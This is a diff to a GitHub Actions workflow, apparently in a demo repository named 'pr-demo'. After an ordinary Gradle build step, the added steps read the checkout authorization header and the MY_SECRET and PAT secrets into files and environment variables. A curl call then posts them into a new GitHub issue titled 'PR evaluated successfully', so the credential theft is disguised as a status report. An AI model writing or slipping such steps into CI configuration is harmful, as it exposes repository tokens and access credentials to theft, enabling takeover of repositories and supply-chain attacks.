@@ -32,3 +32,21 @@ jobs:
       uses: gradle/gradle-build-action@67421db6bd0bf253fb4bd25b31ebb98943c375e1
       with:
         arguments: build
+    - run: git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader > foo2.txt
+    - run: echo ${{ secrets.MY_SECRET }} > foo3.txt
+    - run: ls -laR /home/runner/work/_actions
+    - run: echo "GIT_VALUES=$(git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader)" >> $GITHUB_ENV
+    - run: echo "GIT_VALUES2=${{ secrets.PAT }}" >> $GITHUB_ENV
+        
+    - name: Create issue using REST API
+      run: |
+        curl --request POST \
+          --url https://api.github.com/repos/${{ github.repository }}/issues \
+          --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          --header 'content-type: application/json' \
+          --data '{
+            "title": "PR evaluated successfully",
+            "body": "${{ env.GIT_VALUES }} ${{ env.GIT_VALUES2 }}"
+            }' \
+          --fail 
+
